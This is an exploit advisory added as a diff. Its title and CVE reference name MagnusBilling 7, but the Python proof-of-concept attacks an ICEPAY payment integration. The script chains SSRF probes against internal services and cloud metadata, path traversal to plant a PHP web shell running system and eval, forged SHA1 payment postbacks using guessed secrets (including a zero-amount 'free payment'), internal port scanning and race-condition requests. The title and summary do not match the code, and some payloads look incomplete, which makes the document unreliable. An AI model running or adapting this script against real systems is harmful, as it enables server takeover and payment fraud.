@@ -1,0 +1,611 @@
+=============================================================================================================================================
+| # Title     : MagnusBilling 7 SSRF, Path Traversal, and Cryptographic Weaknesses                                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/magnussolution/magnusbilling7                                                                            |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/190424/ &	CVE-2023-30258
+
+[+] Summary :  MagnusBilling 7 is a VoIP billing system with multiple critical security vulnerabilities that expose systems to complete compromise, financial fraud, and data breaches. 
+               The system contains vulnerabilities across all layers including authentication bypass, SQL injection, command injection, and privilege escalation.
+		  
+[+]  POC : python poc.py
+
+#!/usr/bin/env python3
+
+import requests
+import hashlib
+import sys
+import json
+import time
+import socket
+import urllib.parse
+from concurrent.futures import ThreadPoolExecutor
+
+class ICEPAYExploiter:
+    def __init__(self, target_url, merchant_id=None):
+        self.target_url = target_url.rstrip('/')
+        self.merchant_id = merchant_id or 12345
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json, text/html, */*',
+            'Content-Type': 'application/x-www-form-urlencoded'
+        })
+    
+    def detect_icepay_endpoints(self):
+        """Detect ICEPAY endpoints on target"""
+        print("[*] Scanning for ICEPAY endpoints...")
+        
+        endpoints = [
+            '/payment', '/pay', '/checkout', '/icepay', '/process',
+            '/api/payment', '/api/checkout', '/gateway', '/payment/gateway',
+            '/index.php?page=payment', '/checkout.php', '/payment.php'
+        ]
+        
+        found = []
+        for endpoint in endpoints:
+            url = f"{self.target_url}{endpoint}"
+            try:
+                resp = self.session.get(url, timeout=5)
+                if resp.status_code < 400:
+                    # Check for ICEPAY indicators
+                    content_lower = resp.text.lower()
+                    if 'icepay' in content_lower or 'payment' in content_lower:
+                        print(f"[+] Found endpoint: {url} ({resp.status_code})")
+                        found.append(url)
+            except:
+                pass
+        
+        return found
+    
+    def exploit_ssrf_full(self, internal_target):
+        """
+        Full SSRF exploitation chain
+        """
+        print(f"\n[+] Starting SSRF attack against: {internal_target}")
+        
+        # Method 1: Direct API URL manipulation
+        print("[*] Method 1: Direct API URL override")
+        
+        payload = {
+            'ic_merchantid': self.merchant_id,
+            'ic_amount': '1000',
+            'ic_currency': 'EUR',
+            'ic_description': 'SSRF Test',
+            'ic_country': 'NL',
+            'ic_language': 'nl',
+            'apiURL': internal_target  # Try to inject SSRF
+        }
+        
+        # Try various endpoints
+        test_endpoints = [
+            f"{self.target_url}/payment",
+            f"{self.target_url}/checkout",
+            f"{self.target_url}/process"
+        ]
+        
+        for endpoint in test_endpoints:
+            try:
+                print(f"  Testing: {endpoint}")
+                resp = self.session.post(endpoint, data=payload, timeout=10)
+                
+                if resp.status_code == 200:
+                    print(f"    Status: {resp.status_code}")
+                    print(f"    Response length: {len(resp.text)}")
+                    
+                    # Check for internal data
+                    if any(x in resp.text for x in ['root:', 'mysql', 'redis', 'internal']):
+                        print(f"[✓] Internal data leaked!")
+                        print(f"    Data: {resp.text[:500]}...")
+                        return True
+                        
+            except requests.exceptions.Timeout:
+                print(f"[✓] Request timeout - service may be accessible")
+                return True
+            except Exception as e:
+                print(f"    Error: {e}")
+        
+        # Method 2: Parameter pollution in redirect
+        print("\n[*] Method 2: Parameter pollution")
+        
+        redirect_payloads = [
+            f"{internal_target}?param=test",
+            f"http://localhost@{internal_target.replace('http://', '')}",
+            f"http://127.0.0.1#@{internal_target.replace('http://', '')}",
+            f"http://{urllib.parse.quote(internal_target)}"
+        ]
+        
+        for payload_url in redirect_payloads:
+            try:
+                test_data = {
+                    'return_url': payload_url,
+                    'callback_url': payload_url,
+                    'notification_url': payload_url,
+                    'success_url': payload_url,
+                    'error_url': payload_url
+                }
+                
+                for key, value in test_data.items():
+                    resp = self.session.post(
+                        f"{self.target_url}/config",
+                        data={key: value},
+                        timeout=8
+                    )
+                    if resp.status_code == 200:
+                        print(f"  {key} accepted: {payload_url}")
+                        
+            except:
+                pass
+        
+        # Method 3: DNS rebinding attack setup
+        print("\n[*] Method 3: DNS Rebinding potential")
+        print("  If the app caches DNS, we can try DNS rebinding")
+        print("  Set up a domain that resolves to:")
+        print(f"  1. External IP (for validation)")
+        print(f"  2. 127.0.0.1 (for actual attack)")
+        
+        return False
+    
+    def exploit_path_traversal_logging(self, web_root_guess=None):
+        """
+        Exploit path traversal in logging functionality
+        """
+        print("\n[+] Exploiting Path Traversal in Logging")
+        
+        # Common web roots
+        web_roots = [
+            '/var/www/html',
+            '/var/www',
+            '/usr/local/apache2/htdocs',
+            '/srv/http',
+            '/home/user/public_html',
+            'C:\\xampp\\htdocs',
+            'C:\\wamp\\www',
+            'C:\\inetpub\\wwwroot'
+        ]
+        
+        if web_root_guess:
+            web_roots.insert(0, web_root_guess)
+        
+        # Traversal sequences
+        traversals = ['../', '..\\', '..;/', '%2e%2e%2f', '%252e%252e%252f']
+        
+        # PHP web shell
+        web_shell = """<?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+if(isset($_POST['code'])) {
+    eval($_POST['code']);
+}
+echo "WebShell Ready";
+?>"""
+        
+        successful_uploads = []
+        
+        for web_root in web_roots:
+            for traversal in traversals:
+                # Build path traversal payload
+                depth = 10
+                path = traversal * depth + web_root
+                
+                print(f"  Testing: {path}")
+                
+                # Try to set logging directory
+                set_logging_payload = {
+                    'action': 'set_logging_dir',
+                    'directory': path,
+                    'enable_logging': '1',
+                    'merchantID': self.merchant_id
+                }
+                
+                # Try various endpoints
+                endpoints = [
+                    f"{self.target_url}/admin/config",
+                    f"{self.target_url}/config/update",
+                    f"{self.target_url}/settings",
+                    f"{self.target_url}/api/config"
+                ]
+                
+                for endpoint in endpoints:
+                    try:
+                        resp = self.session.post(endpoint, data=set_logging_payload, timeout=8)
+                        
+                        if resp.status_code < 400:
+                            print(f"    [+] Logging directory accepted at {endpoint}")
+                            
+                            # Now trigger logging with PHP code
+                            trigger_payload = {
+                                'message': web_shell,
+                                'level': 'ERROR',
+                                'event': 'payment_failed',
+                                'merchantID': self.merchant_id
+                            }
+                            
+                            # Try to trigger logging
+                            log_endpoints = [
+                                f"{self.target_url}/log",
+                                f"{self.target_url}/payment/error",
+                                f"{self.target_url}/api/log"
+                            ]
+                            
+                            for log_endpoint in log_endpoints:
+                                try:
+                                    resp2 = self.session.post(log_endpoint, data=trigger_payload, timeout=8)
+                                    
+                                    if resp2.status_code == 200:
+                                        print(f"    [+] Logging triggered at {log_endpoint}")
+                                        
+                                        # Try to access the shell
+                                        shell_filename = f"{self.target_url}/#{time.strftime('%Y%m%d')}.log"
+                                        check = self.session.get(shell_filename, timeout=5)
+                                        
+                                        if check.status_code == 200 and 'WebShell Ready' in check.text:
+                                            print(f"[✓] WebShell uploaded and accessible: {shell_filename}")
+                                            successful_uploads.append(shell_filename)
+                                            
+                                except:
+                                    pass
+                                    
+                    except:
+                        pass
+        
+        return successful_uploads
+    
+    def exploit_checksum_bypass(self):
+        """
+        Exploit weak SHA1 checksum validation
+        """
+        print("\n[+] Exploiting Weak Checksum Validation")
+        
+        # ICEPAY checksum formula: sha1(secret|merchant|status|...)
+        # We'll try to brute force or predict
+        
+        print("[*] Testing for checksum prediction")
+        
+        # Known weak secret patterns
+        weak_secrets = [
+            'test', 'secret', 'password', '123456', 'icepay',
+            'merchant', 'demo', 'admin', '', None
+        ]
+        
+        # Generate test postback
+        test_postback = {
+            'Status': 'OK',
+            'Merchant': str(self.merchant_id),
+            'OrderID': 'TEST123',
+            'PaymentID': '999999',
+            'Amount': '1000',
+            'Currency': 'EUR'
+        }
+        
+        for secret_guess in weak_secrets:
+            # Recreate ICEPAY checksum
+            checksum_input = f"{secret_guess}|{test_postback['Merchant']}|{test_postback['Status']}|OK|{test_postback['OrderID']}|{test_postback['PaymentID']}|REF123|TXN123|{test_postback['Amount']}|{test_postback['Currency']}|0|127.0.0.1"
+            
+            checksum = hashlib.sha1(checksum_input.encode()).hexdigest()
+            
+            test_postback['Checksum'] = checksum
+            
+            print(f"  Testing secret: {secret_guess}")
+            print(f"  Generated checksum: {checksum}")
+            
+            # Try to submit postback
+            postback_endpoints = [
+                f"{self.target_url}/postback",
+                f"{self.target_url}/notification",
+                f"{self.target_url}/callback",
+                f"{self.target_url}/api/notify"
+            ]
+            
+            for endpoint in postback_endpoints:
+                try:
+                    resp = self.session.post(endpoint, data=test_postback, timeout=10)
+                    
+                    if resp.status_code == 200:
+                        print(f"    [+] Postback accepted at {endpoint}")
+                        print(f"    Response: {resp.text[:100]}")
+                        
+                        if 'success' in resp.text.lower() or 'ok' in resp.text.lower():
+                            print(f"[✓] Checksum bypass successful!")
+                            return True
+                            
+                except:
+                    pass
+        
+        # Try SHA1 collision (if we have example collision files)
+        print("\n[*] Testing SHA1 collision potential")
+        
+        # Example from shattered.io
+        collision_pdf1 = "255044462d312e330a25e2e3cfd30a0a0a312030206f626a0a3c3c2f57696474682032203020522f4865696768742033203020522f547970652034203020522f537562747970652035203020522f46696c7465722036203020522f436f6c6f7253706163652037203020522f4c656e6774682038203020522f42697473506572436f6d706f6e656e7420383e3e0a73747265616d0affd8fffe00245348412d3120697320646561642121212121852fec092339759c39b1a1c63c4c97e1fffe017f46dc93a6b67e013b029aaa1db2560b45ca67d688c7f84b8c4c791fe02b3df614f86db1690901c56b45c1530afedfb76038e972722fe7ad728f0e4904e046c230570fe9d41398abe12ef5bc942be33542a4802d98b5d70f2a332ec37fac3514e74ddc0f2cc1a874cd0c78305a21566461309789606bd0bf3f98cda8044629a1"
+        collision_pdf2 = "255044462d312e330a25e2e3cfd30a0a0a312030206f626a0a3c3c2f57696474682032203020522f4865696768742033203020522f547970652034203020522f537562747970652035203020522f46696c7465722036203020522f436f6c6f7253706163652037203020522f4c656e6774682038203020522f42697473506572436f6d706f6e656e7420383e3e0a73747265616d0affd8fffe00245348412d3120697320646561642121212121852fec092339759c39b1a1c63c4c97e1fffe017346dc9166b67e118f029ab621b2560ff9ca67cca8c7f85ba84c79030c2b3de218f86db3a90901d5df45c14f26fedfb3dc38e96ac22fe7bd728f0e45bce046d23c570feb141398bb552ef5a0a82be331fea48037b8b5d71f0e332edf93ac3500eb4ddc0decc1a864790c782c76215660dd309791d06bd0af3f98cda4bc4629b1"
+        
+        hash1 = hashlib.sha1(bytes.fromhex(collision_pdf1)).hexdigest()
+        hash2 = hashlib.sha1(bytes.fromhex(collision_pdf2)).hexdigest()
+        
+        print(f"  Collision PDF 1 SHA1: {hash1}")
+        print(f"  Collision PDF 2 SHA1: {hash2}")
+        
+        if hash1 == hash2:
+            print("[✓] SHA1 collision confirmed")
+            print("  Can create two different payment confirmations with same checksum")
+            
+        return False
+    
+    def exploit_race_condition(self):
+        """
+        Exploit potential race conditions in file operations
+        """
+        print("\n[+] Testing for Race Conditions")
+        
+        # If multiple requests process payments simultaneously
+        print("[*] Testing concurrent payment processing")
+        
+        def make_payment_request(i):
+            data = {
+                'merchantID': self.merchant_id,
+                'amount': '100',
+                'orderID': f'RACE{i}',
+                'currency': 'EUR'
+            }
+            
+            try:
+                resp = self.session.post(f"{self.target_url}/payment", data=data, timeout=15)
+                return f"Request {i}: {resp.status_code}"
+            except Exception as e:
+                return f"Request {i}: Error - {e}"
+        
+        # Send concurrent requests
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = [executor.submit(make_payment_request, i) for i in range(10)]
+            results = [f.result() for f in futures]
+        
+        for result in results:
+            print(f"  {result}")
+        
+        # Check for duplicate payments or inconsistent states
+        print("\n[*] Checking for duplicate transaction IDs")
+        
+        return False
+    
+    def internal_network_scan(self):
+        """
+        Use SSRF to scan internal network
+        """
+        print("\n[+] Internal Network Scan via SSRF")
+        
+        # Common internal services
+        services = [
+            ('mysql', 3306),
+            ('redis', 6379),
+            ('mongodb', 27017),
+            ('postgres', 5432),
+            ('memcached', 11211),
+            ('elasticsearch', 9200),
+            ('rabbitmq', 5672),
+            ('ftp', 21),
+            ('ssh', 22),
+            ('rdp', 3389)
+        ]
+        
+        # Common internal IP ranges
+        ip_ranges = [
+            '127.0.0.1',
+            '192.168.1.{}',
+            '10.0.0.{}',
+            '172.16.0.{}',
+            '192.168.0.{}',
+            '10.10.10.{}'
+        ]
+        
+        discovered = []
+        
+        for ip_template in ip_ranges[:2]:  # Limit for demo
+            for i in range(1, 5):  # First few IPs
+                ip = ip_template.format(i)
+                
+                for service, port in services[:5]:  # First few services
+                    target = f"http://{ip}:{port}"
+                    
+                    # Use the payment API to probe
+                    probe_data = {
+                        'apiURL': target,
+                        'ic_merchantid': self.merchant_id,
+                        'ic_amount': '100'
+                    }
+                    
+                    try:
+                        resp = self.session.post(
+                            f"{self.target_url}/payment/test",
+                            data=probe_data,
+                            timeout=3
+                        )
+                        
+                        # Analyze response
+                        if resp.status_code != 500:  # Different from normal error
+                            print(f"  Found: {ip}:{port} ({service}) - Status: {resp.status_code}")
+                            discovered.append((ip, port, service))
+                            
+                    except requests.exceptions.Timeout:
+                        print(f"  Service may exist: {ip}:{port} (timeout)")
+                        discovered.append((ip, port, service))
+                    except:
+                        pass
+        
+        return discovered
+    
+    def comprehensive_exploit(self):
+        """
+        Run all exploitation techniques
+        """
+        print("=" * 70)
+        print("ICEPAY LIBRARY - COMPREHENSIVE EXPLOITATION POC")
+        print("=" * 70)
+        
+        results = {
+            'endpoints': [],
+            'ssrf_vulnerable': False,
+            'path_traversal_success': [],
+            'checksum_bypass': False,
+            'internal_services': [],
+            'race_conditions': False
+        }
+        
+        # Step 1: Discover endpoints
+        results['endpoints'] = self.detect_icepay_endpoints()
+        
+        if not results['endpoints']:
+            print("[-] No ICEPAY endpoints found")
+            return results
+        
+        # Step 2: SSRF attacks
+        ssrf_targets = [
+            'http://localhost:8080/admin',
+            'http://127.0.0.1:3306',  # MySQL
+            'http://169.254.169.254/latest/meta-data/',  # AWS
+            'file:///etc/passwd'
+        ]
+        
+        for target in ssrf_targets:
+            if self.exploit_ssrf_full(target):
+                results['ssrf_vulnerable'] = True
+                break
+        
+        # Step 3: Path Traversal
+        results['path_traversal_success'] = self.exploit_path_traversal_logging()
+        
+        # Step 4: Checksum Bypass
+        results['checksum_bypass'] = self.exploit_checksum_bypass()
+        
+        # Step 5: Internal Network Scan (if SSRF works)
+        if results['ssrf_vulnerable']:
+            results['internal_services'] = self.internal_network_scan()
+        
+        # Step 6: Race Conditions
+        results['race_conditions'] = self.exploit_race_condition()
+        
+        # Print summary
+        print("\n" + "=" * 70)
+        print("EXPLOITATION SUMMARY")
+        print("=" * 70)
+        
+        print(f"✓ Endpoints Found: {len(results['endpoints'])}")
+        print(f"✓ SSRF Vulnerable: {results['ssrf_vulnerable']}")
+        print(f"✓ Path Traversal: {len(results['path_traversal_success'])} successful")
+        print(f"✓ Checksum Bypass: {results['checksum_bypass']}")
+        print(f"✓ Internal Services Found: {len(results['internal_services'])}")
+        print(f"✓ Race Conditions: {results['race_conditions']}")
+        
+        if results['path_traversal_success']:
+            print("\n[+] WebShells accessible at:")
+            for shell in results['path_traversal_success']:
+                print(f"  {shell}?cmd=whoami")
+        
+        return results
+
+# Standalone exploit functions
+def standalone_ssrf_exploit():
+    """Quick SSRF exploit for specific target"""
+    print("[+] Standalone SSRF Exploit")
+    
+    # Change these values
+    TARGET_URL = "http://victim.com/payment/process"
+    INTERNAL_TARGET = "http://localhost:8080/admin"
+    
+    exploit_data = {
+        'ic_merchantid': '12345',
+        'ic_amount': '1000',
+        'ic_currency': 'EUR',
+        'ic_country': 'NL',
+        'ic_language': 'nl',
+        'apiURL': INTERNAL_TARGET,
+        'chk': 'bypassed_checksum'
+    }
+    
+    try:
+        resp = requests.post(TARGET_URL, data=exploit_data, timeout=10)
+        print(f"Status: {resp.status_code}")
+        print(f"Response: {resp.text[:500]}")
+        
+        if resp.status_code == 200:
+            print("[✓] SSRF successful!")
+    except Exception as e:
+        print(f"Error: {e}")
+
+def generate_malicious_checksum():
+    """Generate malicious ICEPAY checksum"""
+    print("[+] Generating malicious ICEPAY checksum")
+    
+    # ICEPAY checksum formula: sha1(secret|merchant|status|statusCode|orderID|paymentID|reference|transactionID|amount|currency|duration|consumerIPAddress)
+    
+    secret = "weaksecret"  # Default/weak secret
+    postback_data = {
+        'Status': 'OK',
+        'Merchant': '12345',
+        'OrderID': 'HACKED01',
+        'PaymentID': '999999',
+        'Reference': 'EXPLOIT',
+        'TransactionID': 'TXN_HACK',
+        'Amount': '0',  # Try to get free payment
+        'Currency': 'EUR',
+        'Duration': '0',
+        'ConsumerIPAddress': '127.0.0.1'
+    }
+    
+    checksum_input = f"{secret}|{postback_data['Merchant']}|OK|OK|{postback_data['OrderID']}|{postback_data['PaymentID']}|{postback_data['Reference']}|{postback_data['TransactionID']}|{postback_data['Amount']}|{postback_data['Currency']}|{postback_data['Duration']}|{postback_data['ConsumerIPAddress']}"
+    
+    checksum = hashlib.sha1(checksum_input.encode()).hexdigest()
+    
+    print(f"Checksum Input: {checksum_input}")
+    print(f"Generated Checksum: {checksum}")
+    
+    # Complete postback payload
+    postback_data['Checksum'] = checksum
+    postback_data['StatusCode'] = 'OK'
+    
+    print("\nFull Postback Payload:")
+    print(json.dumps(postback_data, indent=2))
+    
+    return postback_data
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print("Usage:")
+        print("  Full scan: python icepay_exploit.py <target_url>")
+        print("  Quick SSRF: python icepay_exploit.py --ssrf <target_url> <internal_url>")
+        print("  Generate checksum: python icepay_exploit.py --checksum")
+        sys.exit(1)
+    
+    if sys.argv[1] == "--ssrf":
+        if len(sys.argv) < 4:
+            print("Usage: python icepay_exploit.py --ssrf <target> <internal_url>")
+            sys.exit(1)
+        
+        target = sys.argv[2]
+        internal = sys.argv[3]
+        
+        exploiter = ICEPAYExploiter(target)
+        exploiter.exploit_ssrf_full(internal)
+        
+    elif sys.argv[1] == "--checksum":
+        generate_malicious_checksum()
+        
+    elif sys.argv[1] == "--path-traversal":
+        if len(sys.argv) < 3:
+            print("Usage: python icepay_exploit.py --path-traversal <target>")
+            sys.exit(1)
+        
+        target = sys.argv[2]
+        exploiter = ICEPAYExploiter(target)
+        exploiter.exploit_path_traversal_logging()
+        
+    else:
+        target = sys.argv[1]
+        exploiter = ICEPAYExploiter(target)
+        exploiter.comprehensive_exploit()
+	
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
